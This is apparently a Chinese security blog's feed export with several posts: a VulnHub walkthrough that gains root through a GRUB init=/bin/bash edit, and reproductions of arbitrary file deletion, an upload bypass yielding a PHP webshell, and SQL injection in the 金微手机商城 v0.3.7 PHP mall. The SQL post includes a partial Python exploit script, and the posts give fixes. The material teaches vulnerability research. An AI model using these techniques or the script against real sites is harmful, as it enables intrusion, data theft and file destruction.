            <tag> 漏洞复现 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> 提权 </tag>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>靶机渗透——bosspalyer</title>
      <link href="/posts/d726e92e.html"/>
      <url>/posts/d726e92e.html</url>
      
        <content type="html"><![CDATA[<h3 id="任务环境"><a href="#任务环境" class="headerlink" title="任务环境"></a>任务环境</h3><p>攻击机：Kali2019</p><p>靶机：<a href="https://www.vulnhub.com/entry/bossplayersctf-1,375/" target="_blank" rel="noopener">bosspalyer</a></p><p>知识点：单用户进操作系统</p><h3 id="编辑内核文件"><a href="#编辑内核文件" class="headerlink" title="编辑内核文件"></a>编辑内核文件</h3><p>打开靶机之后直接按e编辑内核<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200206170634231.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>找到/boot启动文件点<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200206171030163.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>将这里的 <strong>ro</strong> 改为 <strong>rw</strong> 并在后面加上 <strong>init=/bin/bash</strong></p><h3 id="获取权限"><a href="#获取权限" class="headerlink" title="获取权限"></a>获取权限</h3><p>然后按Ctrl+x单用户进系统</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200206171331183.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>进入root目录下ls查看文件</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200206172104494.png" alt="在这里插入图片描述"></p><h3 id="解码获得Flag"><a href="#解码获得Flag" class="headerlink" title="解码获得Flag"></a>解码获得Flag</h3><p>拿到一个base64编码的字符串</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200206172447443.png" alt="在这里插入图片描述"></p><p>解码以后拿到flag</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200206172559292.png" alt="在这里插入图片描述"></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 渗透测试篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 内网渗透 </tag>
            
            <tag> 提权 </tag>
            
            <tag> 靶机渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>金微手机商城v0.3.7任意文件删除漏洞复现</title>
      <link href="/posts/c8638861.html"/>
      <url>/posts/c8638861.html</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>这里还是用的我本地的站点，先跑一下之前写好的exp，拿到后台账号admin，密码Admin888。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210130222456164.png" alt="在这里插入图片描述"></p><p>登陆后台后来到 <strong>商品管理</strong>–&gt; <strong>文件管理</strong>，这里的操作，都可以通过抓包改包来删除任意文件<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2021013022251287.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>选中一个文件，然后点击删除，看一下它的数据包：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210130222524193.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>直接改一下包：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210130222536617.png" alt="在这里插入图片描述"><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210130222542315.png" alt="在这里插入图片描述"></p><p>发包后，执行失败，看来做了过滤，去读一下源码吧还是<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210130222602134.png" alt="在这里插入图片描述"></p><h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><p>原来它就是判断数组中是不是存在..这个关键字：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210130222625879.png" alt="在这里插入图片描述"><br>这里我做了很多尝试，最开始是采用各种编码去试一下，结果都没过去，我就抓了个查看目录的包，看了试了一下有没有目录遍历，结果真的有意外收获</p><p>访问它的根目录，会报错，直接把网站的绝对路径爆出来了：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210130222657548.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>接着来读一下www目录下的所有文件，成功读取到了目录：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210130222710349.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>剩下直接删一个目录，我在www下创建一个test目录用于测试<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2021013022273618.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>抓包改包，成功越级删除www目录下test文件，以此类推，只要知道绝对路径，利用文件读取+文件删除，就能实现任意文件删除了<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210130222748725.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>再来两张读取目录文件的图，只要读出来的，都可以删除！<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210130222803372.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210130222809206.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>当时复现这个漏洞的时候，我一失手直接把Windows的组件删了，第二天我开虚拟机的时候还纳闷虚拟机怎么打不开了…<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210130222814917.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>漏洞的根本还是出现在信息泄露上，如果攻击者不知道网站的绝对路径，是无法完成攻击的，所以我这里就关闭了PHP的报错，防止它泄露出文件的绝对路径</p><pre class="line-numbers language-php"><code class="language-php"><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样一来，无论传什么值，他都会返回一个OK，攻击者就没法通过admin.php这个文件来获取网站的绝对路径，也就没法任意文件删除了<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210130230851898.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 代码审计篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> PHP </tag>
            
            <tag> 0day </tag>
            
            <tag> 漏洞挖掘 </tag>
            
            <tag> 漏洞复现 </tag>
            
            <tag> Exp </tag>
            
            <tag> 任意文件删除 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>金微手机商城v0.3.7 文件上传漏洞复现</title>
      <link href="/posts/3c771888.html"/>
      <url>/posts/3c771888.html</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>这个漏洞的前提就是要有他的后台账号密码，结合之前审计的SQL注入漏洞，就能把它的威力发挥到最大。<br><a href="https://imgtu.com/i/6CRx54" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://s3.ax1x.com/2021/02/28/6CRx54.md.png" alt=""></a></p><h3 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h3><p>这里还是用的我本地的站点（主要他的站上了WAF，实在是能力有限），先跑一下之前写好的exp，拿到后台账号admin，密码Admin888<br><a href="https://imgtu.com/i/6CfLAU" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://s3.ax1x.com/2021/02/28/6CfLAU.png" alt=""></a></p><p>登陆后台后来到 商品管理–&gt; 文件管理–&gt; 上传文件<br><a href="https://imgtu.com/i/6ChCB6" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://s3.ax1x.com/2021/02/28/6ChCB6.png" alt=""></a></p><p>这里先上传一个图片马<br><a href="https://imgtu.com/i/6ChA4e" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://s3.ax1x.com/2021/02/28/6ChA4e.png" alt=""></a></p><p>将后缀名改为.php，然后访问文件，成功解析<br><a href="https://imgtu.com/i/6ChZ3d" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://s3.ax1x.com/2021/02/28/6ChZ3d.png" alt=""></a></p><p>等等！当我准备连接的时候！我发现一个问题！我大意了啊，我发现应用程序将我上传后的图片进行了二次渲染，也就是只取出渲染后图片的那一部分内容，重新命名xxx.jpg，于是，我又反过头去看了一下源码，才明白其中的奥妙</p><h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><p>如图，重点就在这里，imagecreatefromgif()这个函数对图片进行了二次渲染<br><a href="https://imgtu.com/i/6ChaD0" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://s3.ax1x.com/2021/02/28/6ChaD0.png" alt=""></a></p><p>那么接下来就是去绕过这个函数的渲染，详(tong)细(ku)的过程就不一一做笔记了，主要分以下几步：</p><p>1、先上传一张xxx.gif的动态图，经过二次渲染会变成xxx.jpg<br>2、把xxx.jpg下载下来，再次制作图片马，假如名字为a.jpg，我们再次上传<br>3、把渲染过的a.jpg下载下来，这里改名为b.jpg<br>4、用C32Asm进行对比，将图片a与图片b中内容一致的内容，修改成php一句话木马<br>5、上传，改后缀名即可</p><p>原图a.jpg：<br><a href="https://imgtu.com/i/6C48Z6" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://s3.ax1x.com/2021/02/28/6C48Z6.png" alt=""></a></p><p>成功上传后的图b.jpg：<br><a href="https://imgtu.com/i/6C4azd" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://s3.ax1x.com/2021/02/28/6C4azd.png" alt=""></a></p><h3 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h3><p>直接连接一下就行了，这次审计没白忙活啊！又学会了新的上传绕过姿势，美汁儿汁儿~<br><a href="https://imgtu.com/i/6C4BLt" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://s3.ax1x.com/2021/02/28/6C4BLt.png" alt=""></a></p><h3 id="临时修复"><a href="#临时修复" class="headerlink" title="临时修复"></a>临时修复</h3><p>可以看到，这个文件上传的根本原因出现在<strong>改名</strong>这个操作上，是因为开发者太信任用户的操作，这是不对的，所以这里我对它的改名做了一个微调，用户只要想修改文件名，没问题，但是改完后的文件我会强制定义为 <strong>.jpg</strong>格式</p><p>部分代码：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">case</span> <span class="token string">"sfe"</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">//文件改名                                                 </span><span class="token function">Rid</span><span class="token punctuation">(</span><span class="token string">"C"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                                         <span class="token variable">$a</span><span class="token operator">=</span><span class="token function">Frc</span><span class="token punctuation">(</span><span class="token variable">$m</span><span class="token punctuation">[</span><span class="token string">"dir"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                                  <span class="token variable">$b</span><span class="token operator">=</span><span class="token function">Frc</span><span class="token punctuation">(</span><span class="token variable">$m</span><span class="token punctuation">[</span><span class="token string">"fnm"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                                  <span class="token variable">$c</span><span class="token operator">=</span><span class="token function">Frc</span><span class="token punctuation">(</span><span class="token variable">$m</span><span class="token punctuation">[</span><span class="token string">"fno"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                                  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">.</span><span class="token variable">$b</span><span class="token punctuation">.</span><span class="token string">'.jpg'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'{"msg":"文件已存在！"}'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment"># 强制定义文件后缀为.jpg</span><span class="token function">rename</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">.</span><span class="token variable">$c</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">.</span><span class="token variable">$b</span><span class="token punctuation">.</span><span class="token string">'.jpg'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                       <span class="token keyword">echo</span> <span class="token string">'{"msg":"ok"}'</span><span class="token punctuation">;</span>                                               <span class="token keyword">break</span><span class="token punctuation">;</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>来看一下修改后的效果，先上传一个图片马<br><a href="https://imgtu.com/i/6C42WQ" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://s3.ax1x.com/2021/02/28/6C42WQ.png" alt=""></a></p><p>尝试改名为sb.php<br><a href="https://imgtu.com/i/6C4Ie0" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://s3.ax1x.com/2021/02/28/6C4Ie0.png" alt=""></a></p><p>成功拦截<br><a href="https://imgtu.com/i/6C4bYF" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://s3.ax1x.com/2021/02/28/6C4bYF.png" alt=""></a></p><p>到服务器看一下，结果是一样的<br><a href="https://imgtu.com/i/6C4OSJ" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://s3.ax1x.com/2021/02/28/6C4OSJ.png" alt=""></a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 代码审计篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> PHP </tag>
            
            <tag> 0day </tag>
            
            <tag> 漏洞挖掘 </tag>
            
            <tag> 漏洞复现 </tag>
            
            <tag> Exp </tag>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>金微手机商城v0.3.7SQL注入漏洞复现</title>
      <link href="/posts/407cb4d.html"/>
      <url>/posts/407cb4d.html</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><blockquote><p>这是我审计的第一个通用型漏洞，这个商城系统当时审计出来了三处高危，但有一个被定级为低危，今天正好有时间就来更新一下吧<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210128192037643.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p></blockquote><h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><p>漏洞出现在itme.php中，来看一下源码：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210128192202366.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以看到，它这里把变量直接拼接到了SQL语句中，前面经过了Qry跟Qra函数的处理，最终把结果返回给了$r，我又跟了一下这两个函数，发现就是一个数据库处理的操作：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210128192309583.png" alt="在这里插入图片描述"><br><strong>ps：当时是真的菜，不应该去追Qry跟Qra函数的，现在回过头来总结，一看就知道问题出现在Req这个函数中，现在我们再去审一下吧</strong></p><p>这是它Req函数的代码，未经过任何的过滤，直接就赋值给了$s：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">Req</span><span class="token punctuation">(</span><span class="token variable">$n</span><span class="token punctuation">,</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span><span class="token variable">$s</span><span class="token operator">=</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token variable">$n</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token variable">$n</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token variable">$n</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token variable">$n</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token operator">==</span><span class="token string">""</span><span class="token punctuation">)</span>        <span class="token variable">$s</span><span class="token operator">=</span><span class="token variable">$c</span><span class="token punctuation">;</span>        <span class="token variable">$s</span><span class="token operator">=</span><span class="token function">Rpl</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"str"</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$s</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$s</span><span class="token punctuation">[</span><span class="token string">"str"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>直接上sqlmap跑一下看看<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210129171314367.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>提示可以注入，但是它办不了这事儿，这时候就需要我们去手工注入一下了，我先是测试了一下and 1=1这类语句，发现程序把特殊字符全部转义成了unicode编码，但是关键字一个也没有过滤！<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210129171439673.png" alt="在这里插入图片描述"></p><p>这里用/**/代替空格，成功执行语句<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210129171453948.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210129171500984.png" alt="在这里插入图片描述"></p><p>看一下传入数据库的语句<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210129171514391.png" alt="在这里插入图片描述"></p><p>到这里我就直接写了个Python脚本，基于Python2.7开发：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token comment" spellcheck="true"># @Time    : 2020/10/16 11:03</span><span class="token comment" spellcheck="true"># @Author  : 1匹黑马</span><span class="token comment" spellcheck="true"># @Site    :</span><span class="token comment" spellcheck="true"># @File    : Web_injection_exp.py</span><span class="token comment" spellcheck="true"># @Software: PyCharm</span><span class="token keyword">import</span> binascii<span class="token keyword">import</span> requests<span class="token keyword">import</span> re<span class="token keyword">def</span> <span class="token function">code_to_hex</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">return</span> <span class="token string">'0x'</span> <span class="token operator">+</span> binascii<span class="token punctuation">.</span>b2a_hex<span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_columns_content</span><span class="token punctuation">(</span>columns<span class="token punctuation">,</span>new_DB<span class="token punctuation">,</span>new_TABLE<span class="token punctuation">)</span><span class="token punctuation">:</span>    num <span class="token operator">=</span> <span class="token string">''</span>    new_length <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        exp <span class="token operator">=</span> url<span class="token operator">+</span>page1<span class="token operator">+</span><span class="token punctuation">(</span><span class="token string">' order by '</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'#'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span><span class="token string">'/**/'</span><span class="token punctuation">)</span>        req <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>exp<span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">)</span><span class="token punctuation">.</span>text        <span class="token keyword">if</span> len<span class="token punctuation">(</span>req<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">300</span><span class="token punctuation">:</span>            length <span class="token operator">=</span> i            num <span class="token operator">=</span> length            <span class="token keyword">break</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> num<span class="token punctuation">)</span><span class="token punctuation">:</span>        new_length<span class="token punctuation">.</span>append<span class="token punctuation">(</span>j<span class="token punctuation">)</span>    exp <span class="token operator">=</span> <span class="token punctuation">(</span>url<span class="token operator">+</span>page2<span class="token operator">+</span>payload <span class="token operator">+</span> str<span class="token punctuation">(</span>new_length<span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">'[]'</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token 